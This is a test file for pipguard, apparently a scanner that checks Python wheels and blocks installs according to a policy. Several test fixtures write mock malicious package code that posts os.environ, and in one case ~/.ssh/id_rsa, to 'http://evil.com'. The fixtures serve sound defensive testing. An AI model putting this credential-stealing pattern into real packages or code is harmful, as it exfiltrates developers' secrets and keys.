"""Tests for install policy behavior."""

import zipfile
from pathlib import Path

from pipguard.core.config import ScanConfig
from pipguard.download.resolver import list_artifacts
from pipguard.cli import _blocked_reason_from_rule, _print_blocked_install_summary
from pipguard.policies.default import should_block
from pipguard.scan.engine import scan_directory
from pipguard.unpack.archive import detect_and_unpack


class TestInstallBlock:
    def test_block_malicious_artifact(self, tmp_path: Path):
        """Simulate downloading a malicious wheel and verify it would be blocked."""
        whl = tmp_path / "evil-0.1-py3-none-any.whl"
        malicious = (
            "import os, requests\n"
            "requests.post('http://evil.com', json=dict(os.environ))\n"
        )
        with zipfile.ZipFile(whl, "w") as zf:
            zf.writestr("evil/__init__.py", malicious)

        artifacts = list_artifacts(tmp_path)
        assert len(artifacts) == 1

        config = ScanConfig(policy="block")
        unpacked = detect_and_unpack(artifacts[0])
        report = scan_directory(unpacked, config)
        assert should_block(report, config)

    def test_allow_benign_artifact(self, tmp_path: Path):
        """Simulate downloading a benign wheel and verify it passes."""
        whl = tmp_path / "good-1.0-py3-none-any.whl"
        with zipfile.ZipFile(whl, "w") as zf:
            zf.writestr("good/__init__.py", "x = 1\n")

        config = ScanConfig(policy="block")
        unpacked = detect_and_unpack(list_artifacts(tmp_path)[0])
        report = scan_directory(unpacked, config)
        assert not should_block(report, config)

    def test_warn_policy_does_not_block(self, tmp_path: Path):
        """With policy=warn, even malicious artifacts should not block."""
        whl = tmp_path / "evil-0.1-py3-none-any.whl"
        malicious = (
            "import os, requests\n"
            "requests.post('http://evil.com', json=dict(os.environ))\n"
        )
        with zipfile.ZipFile(whl, "w") as zf:
            zf.writestr("evil/__init__.py", malicious)

        config = ScanConfig(policy="warn")
        unpacked = detect_and_unpack(list_artifacts(tmp_path)[0])
        report = scan_directory(unpacked, config)
        assert not should_block(report, config)

    def test_allow_critical_override(self, tmp_path: Path):
        """With allow_critical=True, critical findings should not block."""
        whl = tmp_path / "evil-0.1-py3-none-any.whl"
        malicious = (
            "import os, requests\n"
            "data = dict(os.environ)\n"
            "key = open('~/.ssh/id_rsa').read()\n"
            "requests.post('http://evil.com', json={'env': data, 'ssh': key})\n"
        )
        with zipfile.ZipFile(whl, "w") as zf:
            zf.writestr("evil/__init__.py", malicious)

        config = ScanConfig(policy="block", allow_critical=True)
        unpacked = detect_and_unpack(list_artifacts(tmp_path)[0])
        report = scan_directory(unpacked, config)
        assert not should_block(report, config)

    def test_high_severity_blocks_even_if_score_below_threshold(self, tmp_path: Path):
        """High-only findings should still block install by default."""
        whl = tmp_path / "suspicious-0.1-py3-none-any.whl"
        with zipfile.ZipFile(whl, "w") as zf:
            zf.writestr("sitecustomize.py", "print('hello')\n")

        config = ScanConfig(policy="block")
        unpacked = detect_and_unpack(list_artifacts(tmp_path)[0])
        report = scan_directory(unpacked, config)
        assert any(f.severity == "high" for f in report.findings)
        assert should_block(report, config)

    def test_block_reason_mapping(self):
        assert _blocked_reason_from_rule("PTH-EXEC") == "Executable .pth file found"
        assert _blocked_reason_from_rule("SOURCE-TO-SINK").startswith("Contains source-to-sink")
        assert _blocked_reason_from_rule("SOURCE-TO-SINK-FUNCTION").startswith(
            "Contains function-level"
        )

    def test_multi_artifact_blocked_summary_grouping(self, capsys):
        grouped = {
            "artifact-a.whl": [
                scan_finding("PTH-EXEC"),
                scan_finding("ENV-ENUM"),
            ],
            "artifact-b.whl": [
                scan_finding("IOC-PACKAGE"),
            ],
        }
        _print_blocked_install_summary("demo-spec", grouped, None)
        out = capsys.readouterr().out
        assert "Artifact: artifact-a.whl" in out
        assert "Artifact: artifact-b.whl" in out
        assert "Executable .pth file found" in out
        assert "Matches known IOC package/version marker" in out


def scan_finding(rule_id: str):
    from pipguard.models.finding import Finding

    return Finding(
        rule_id=rule_id,
        severity="critical",
        file="x.py",
        message=rule_id,
    )
